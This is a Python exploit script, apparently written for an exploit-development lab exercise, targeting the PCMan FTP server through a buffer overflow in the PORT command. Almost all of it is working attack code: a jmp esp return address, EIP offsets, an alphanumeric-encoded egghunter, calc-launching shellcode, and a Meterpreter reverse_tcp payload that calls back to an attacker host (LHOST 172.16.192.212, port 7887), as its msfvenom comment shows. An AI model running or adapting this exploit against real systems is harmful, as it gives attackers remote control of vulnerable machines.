#!/usr/bin/python
import socket
from struct import pack

host = '172.16.192.177'
port = 21

max_size = 3000


# encoded_calc_esi  =  "w00tw00t"
# encoded_calc_esi += "\x57\x58\x04\x07\x50\x5E\x90"
# encoded_calc_esi += "\x56\x59\x49\x49\x49\x49\x49\x49\x49\x49"
# encoded_calc_esi += "\x49\x49\x49\x49\x49\x49\x49\x49\x37\x51"
# encoded_calc_esi += "\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
# encoded_calc_esi += "\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
# encoded_calc_esi += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75"
# encoded_calc_esi += "\x4a\x49\x4a\x4b\x57\x6b\x63\x6b\x75\x61"
# encoded_calc_esi += "\x59\x50\x36\x30\x44\x71\x6b\x70\x6c\x48"
# encoded_calc_esi += "\x77\x33\x47\x63\x33\x63\x4f\x4b\x6c\x6d"
# encoded_calc_esi += "\x57\x53\x4c\x46\x33\x4c\x79\x6f\x69\x43"
# encoded_calc_esi += "\x54\x71\x39\x50\x32\x70\x6f\x4b\x48\x7a"
# encoded_calc_esi += "\x6b\x7a\x4f\x71\x51\x6c\x49\x6f\x78\x53"
# encoded_calc_esi += "\x38\x68\x6d\x30\x6b\x4f\x59\x6f\x59\x6f"
# encoded_calc_esi += "\x72\x43\x52\x4d\x43\x54\x36\x4e\x62\x45"
# encoded_calc_esi += "\x34\x38\x32\x45\x37\x50\x44\x6f\x50\x63"
# encoded_calc_esi += "\x67\x50\x53\x53\x55\x31\x30\x6c\x53\x53"
# encoded_calc_esi += "\x66\x4e\x73\x55\x54\x38\x65\x35\x41\x41"

encoded_calc_esi  =  "w00tw00t"
encoded_calc_esi += "\x57\x58\x04\x08\x50\x5E\x90"
encoded_calc_esi += "\x56\x59\x49\x49\x49\x49\x49\x49\x49\x49"
encoded_calc_esi += "\x49\x49\x49\x49\x49\x49\x49\x49\x37\x51"
encoded_calc_esi += "\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
encoded_calc_esi += "\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
encoded_calc_esi += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75"
encoded_calc_esi += "\x4a\x49\x4a\x4b\x37\x6b\x61\x4b\x45\x61"
encoded_calc_esi += "\x49\x50\x50\x50\x75\x61\x39\x50\x4f\x78"
encoded_calc_esi += "\x31\x53\x32\x33\x52\x73\x4f\x4b\x4e\x4d"
encoded_calc_esi += "\x76\x43\x6c\x46\x71\x6c\x49\x6f\x38\x53"
encoded_calc_esi += "\x74\x71\x39\x50\x42\x70\x6f\x4b\x49\x6a"
encoded_calc_esi += "\x6a\x6a\x4e\x61\x73\x4c\x59\x6f\x39\x43"
encoded_calc_esi += "\x5a\x48\x6d\x30\x69\x6f\x4b\x4f\x39\x6f"
encoded_calc_esi += "\x52\x43\x50\x6d\x33\x54\x34\x6e\x43\x55"
encoded_calc_esi += "\x44\x38\x75\x35\x65\x70\x64\x6f\x70\x63"
encoded_calc_esi += "\x37\x50\x50\x63\x55\x31\x30\x6c\x72\x43"
encoded_calc_esi += "\x76\x4e\x70\x65\x34\x38\x70\x65\x41\x41"


# msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.192.212 LPORT=7887 -b "\x00\x0a\x0d" -a x86 --platform windows -f py -v rev_met_7887_esi bufferregister=ESI

magic  = "\x8B\xC3"	               #   MOV EAX,EBX
magic += "\x05\x99\x99\x11\x11"    #   ADD EAX,11119999
magic += "\x2D\x99\x75\x11\x11"    #   SUB EAX,11117999
magic += "\x2B\xE0"            #   SUB ESP,EAX
magic += "\x57"    			  #   PUSH EDI
magic += "\x58"			      #   POP EAX
magic += "\x04\x17"		      #   ADD AL,0F
magic += "\x50"			      #   PUSH EAX
magic += "\x5E"			      #   POP ESI
magic += "\x90"	              #   NOP
magic += "\x56"	              #   PUSH ESI
magic += "\x59"			      #   POP ECX

rev_met_7887_esi =  "w00tw00t"
rev_met_7887_esi += magic
print "Number of bytes of magic: " + str(len(magic))
rev_met_7887_esi += "\x56\x59\x49\x49\x49\x49\x49\x49\x49\x49"
rev_met_7887_esi += "\x49\x49\x49\x49\x49\x49\x49\x49\x37\x51"
rev_met_7887_esi += "\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
rev_met_7887_esi += "\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
rev_met_7887_esi += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75"
rev_met_7887_esi += "\x4a\x49\x69\x6c\x4d\x38\x6d\x52\x53\x30"
rev_met_7887_esi += "\x53\x30\x55\x50\x31\x70\x4f\x79\x6a\x45"
rev_met_7887_esi += "\x74\x71\x79\x50\x52\x44\x6e\x6b\x62\x70"
rev_met_7887_esi += "\x54\x70\x6e\x6b\x73\x62\x64\x4c\x4c\x4b"
rev_met_7887_esi += "\x70\x52\x62\x34\x6e\x6b\x72\x52\x36\x48"
rev_met_7887_esi += "\x64\x4f\x4f\x47\x62\x6a\x57\x56\x34\x71"
rev_met_7887_esi += "\x49\x6f\x4e\x4c\x47\x4c\x43\x51\x51\x6c"
rev_met_7887_esi += "\x56\x62\x46\x4c\x71\x30\x4f\x31\x78\x4f"
rev_met_7887_esi += "\x64\x4d\x53\x31\x7a\x67\x39\x72\x78\x72"
rev_met_7887_esi += "\x72\x72\x50\x57\x6e\x6b\x32\x72\x34\x50"
rev_met_7887_esi += "\x4e\x6b\x31\x5a\x55\x6c\x6e\x6b\x32\x6c"
rev_met_7887_esi += "\x76\x71\x61\x68\x39\x73\x47\x38\x76\x61"
rev_met_7887_esi += "\x58\x51\x30\x51\x4e\x6b\x73\x69\x51\x30"
rev_met_7887_esi += "\x77\x71\x79\x43\x6e\x6b\x73\x79\x56\x78"
rev_met_7887_esi += "\x68\x63\x66\x5a\x33\x79\x4c\x4b\x54\x74"
rev_met_7887_esi += "\x6c\x4b\x73\x31\x6a\x76\x35\x61\x6b\x4f"
rev_met_7887_esi += "\x4c\x6c\x59\x51\x6a\x6f\x36\x6d\x36\x61"
rev_met_7887_esi += "\x59\x57\x76\x58\x79\x70\x42\x55\x5a\x56"
rev_met_7887_esi += "\x57\x73\x33\x4d\x58\x78\x35\x6b\x43\x4d"
rev_met_7887_esi += "\x35\x74\x31\x65\x79\x74\x36\x38\x4c\x4b"
rev_met_7887_esi += "\x76\x38\x64\x64\x35\x51\x6e\x33\x71\x76"
rev_met_7887_esi += "\x4e\x6b\x36\x6c\x72\x6b\x6c\x4b\x30\x58"
rev_met_7887_esi += "\x45\x4c\x67\x71\x68\x53\x6c\x4b\x45\x54"
rev_met_7887_esi += "\x4e\x6b\x36\x61\x4e\x30\x4e\x69\x67\x34"
rev_met_7887_esi += "\x55\x74\x64\x64\x63\x6b\x53\x6b\x71\x71"
rev_met_7887_esi += "\x61\x49\x62\x7a\x63\x61\x39\x6f\x59\x70"
rev_met_7887_esi += "\x33\x6f\x73\x6f\x62\x7a\x6e\x6b\x57\x62"
rev_met_7887_esi += "\x58\x6b\x4c\x4d\x43\x6d\x30\x68\x50\x33"
rev_met_7887_esi += "\x75\x62\x33\x30\x47\x70\x31\x78\x62\x57"
rev_met_7887_esi += "\x53\x43\x66\x52\x53\x6f\x52\x74\x32\x48"
rev_met_7887_esi += "\x42\x6c\x63\x47\x57\x56\x37\x77\x6e\x69"
rev_met_7887_esi += "\x4d\x38\x39\x6f\x48\x50\x48\x38\x6e\x70"
rev_met_7887_esi += "\x67\x71\x53\x30\x63\x30\x71\x39\x5a\x64"
rev_met_7887_esi += "\x61\x44\x46\x30\x35\x38\x31\x39\x6d\x50"
rev_met_7887_esi += "\x32\x4b\x37\x70\x39\x6f\x79\x45\x71\x7a"
rev_met_7887_esi += "\x46\x6a\x31\x78\x6c\x6c\x66\x70\x6f\x30"
rev_met_7887_esi += "\x48\x54\x32\x48\x43\x32\x63\x30\x37\x6e"
rev_met_7887_esi += "\x68\x4f\x6e\x69\x49\x76\x62\x70\x50\x50"
rev_met_7887_esi += "\x30\x50\x72\x70\x73\x70\x72\x70\x57\x30"
rev_met_7887_esi += "\x32\x70\x30\x68\x6b\x5a\x56\x6f\x69\x4f"
rev_met_7887_esi += "\x4b\x50\x4b\x4f\x6b\x65\x6a\x37\x70\x6a"
rev_met_7887_esi += "\x74\x50\x62\x76\x72\x77\x31\x78\x6c\x59"
rev_met_7887_esi += "\x69\x35\x71\x64\x63\x51\x6b\x4f\x38\x55"
rev_met_7887_esi += "\x6c\x45\x39\x50\x51\x64\x45\x5a\x49\x6f"
rev_met_7887_esi += "\x30\x4e\x64\x48\x44\x35\x48\x6c\x4a\x48"
rev_met_7887_esi += "\x51\x77\x45\x50\x63\x30\x67\x70\x33\x5a"
rev_met_7887_esi += "\x55\x50\x53\x5a\x77\x74\x42\x76\x50\x57"
rev_met_7887_esi += "\x30\x68\x64\x42\x6e\x39\x4b\x78\x51\x4f"
rev_met_7887_esi += "\x49\x6f\x6e\x35\x6d\x53\x39\x68\x75\x50"
rev_met_7887_esi += "\x31\x6e\x46\x56\x4e\x6b\x74\x76\x71\x7a"
rev_met_7887_esi += "\x47\x30\x45\x38\x77\x70\x62\x30\x33\x30"
rev_met_7887_esi += "\x37\x70\x46\x36\x50\x6a\x63\x30\x71\x78"
rev_met_7887_esi += "\x31\x48\x49\x34\x72\x73\x6b\x55\x49\x6f"
rev_met_7887_esi += "\x6a\x75\x6d\x43\x32\x73\x70\x6a\x33\x30"
rev_met_7887_esi += "\x42\x76\x43\x63\x71\x47\x61\x78\x73\x32"
rev_met_7887_esi += "\x78\x59\x69\x58\x43\x6f\x6b\x4f\x7a\x75"
rev_met_7887_esi += "\x4b\x33\x49\x68\x67\x70\x51\x6d\x76\x48"
rev_met_7887_esi += "\x76\x38\x45\x38\x75\x50\x47\x30\x43\x30"
rev_met_7887_esi += "\x57\x70\x32\x4a\x63\x30\x52\x70\x53\x58"
rev_met_7887_esi += "\x36\x6b\x36\x4f\x46\x6f\x76\x50\x49\x6f"
rev_met_7887_esi += "\x5a\x75\x30\x57\x50\x68\x32\x55\x50\x6e"
rev_met_7887_esi += "\x50\x4d\x55\x31\x79\x6f\x38\x55\x73\x6e"
rev_met_7887_esi += "\x33\x6e\x49\x6f\x74\x4c\x34\x64\x34\x4f"
rev_met_7887_esi += "\x6b\x35\x72\x50\x39\x6f\x49\x6f\x39\x6f"
rev_met_7887_esi += "\x38\x69\x4f\x6b\x79\x6f\x69\x6f\x6b\x4f"
rev_met_7887_esi += "\x76\x61\x6f\x33\x56\x49\x69\x56\x30\x75"
rev_met_7887_esi += "\x4b\x71\x58\x43\x4d\x6b\x38\x70\x6e\x55"
rev_met_7887_esi += "\x69\x32\x30\x56\x42\x4a\x45\x50\x43\x63"
rev_met_7887_esi += "\x49\x6f\x6a\x75\x41\x41"



nops  = "w00tw00t" + "\x90" * 7
calc  = nops 
calc += "\xeb\x1b\x5b\x31\xc0\x50\x31\xc0\x88\x43\x13\x53\xbb\xad\x23\x86\x7c"
calc += "\xff\xd3\x31\xc0\x50\xbb\xfa\xca\x81\x7c\xff\xd3\xe8\xe0\xff\xff\xff"
calc += "\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x63\x61\x6c\x63\x2e\x65"
calc += "\x78\x65"

# msfvenom -p generic/custom PAYLOADFILE=egghunter.bin -e x86/alpha_mixed BufferRegister=EAX -a x86 --platform Windows -f python -v encoded_egg_hunter
egghunter_encoded_eax =  ""
egghunter_encoded_eax += "\x50\x59\x49\x49\x49\x49\x49\x49\x49"
egghunter_encoded_eax += "\x49\x49\x49\x49\x49\x49\x49\x49\x49"
egghunter_encoded_eax += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41"
egghunter_encoded_eax += "\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
egghunter_encoded_eax += "\x32\x42\x42\x30\x42\x42\x41\x42\x58"
egghunter_encoded_eax += "\x50\x38\x41\x42\x75\x4a\x49\x55\x36"
egghunter_encoded_eax += "\x6b\x31\x38\x4a\x69\x6f\x74\x4f\x43"
egghunter_encoded_eax += "\x72\x33\x62\x32\x4a\x74\x42\x52\x78"
egghunter_encoded_eax += "\x48\x4d\x54\x6e\x47\x4c\x65\x55\x62"
egghunter_encoded_eax += "\x7a\x44\x34\x4a\x4f\x6c\x78\x70\x77"
egghunter_encoded_eax += "\x54\x70\x74\x70\x51\x64\x4e\x6b\x69"
egghunter_encoded_eax += "\x6a\x6e\x4f\x54\x35\x69\x7a\x4c\x6f"
egghunter_encoded_eax += "\x71\x65\x78\x67\x59\x6f\x5a\x47\x41"
egghunter_encoded_eax += "\x41"

egghunter_address = ""
egghunter_address += "\x54"				        #   PUSH ESP
egghunter_address += "\x58"					    #   POP EAX
egghunter_address += "\x2D\x3A\x55\x55\x55"     #   SUB EAX,5555553A
egghunter_address += "\x2D\x3A\x55\x55\x55"     #   SUB EAX,5555553A
egghunter_address += "\x2D\x3C\x55\x55\x55"     #   SUB EAX,5555553C

# 0x0043410d : jmp esp | startnull,ascii {PAGE_EXECUTE_READ} [PCManFTPD2.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.0.0.0 (C:\Documents and Settings\Administrator\My Documents\Downloads\pcman\PCManFTPD2.exe)
jmp_esp = pack("<L", 0x74e32fd9)

eip_offset = 2005
esp_offset = 2013
esi_offset = 2025

payload  = "A" * 30
payload += rev_met_7887_esi
print "[+] Length of calc: {0}".format(str(len(rev_met_7887_esi)))
payload += "A" * (eip_offset -len(payload))
payload += jmp_esp
payload += "CCCC"
payload += egghunter_address
payload += "A" * (80 - len(egghunter_address))	
payload += egghunter_encoded_eax
payload += "C" * (max_size - len(payload))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print s.recv(4096)
s.send("USER anonymous\r\n")
print s.recv(4096)
s.send("PASS\r\n")
print s.recv(4096)
print "[*] Sending payload of size: {0} chars...".format(len(payload))
s.send("PORT " + payload + "\r\n")
s.close()

# EMULATING SCENARIO 1:
#	- Alphanumeric Restriction
#	- Limited Space (Egghunter)
# 	 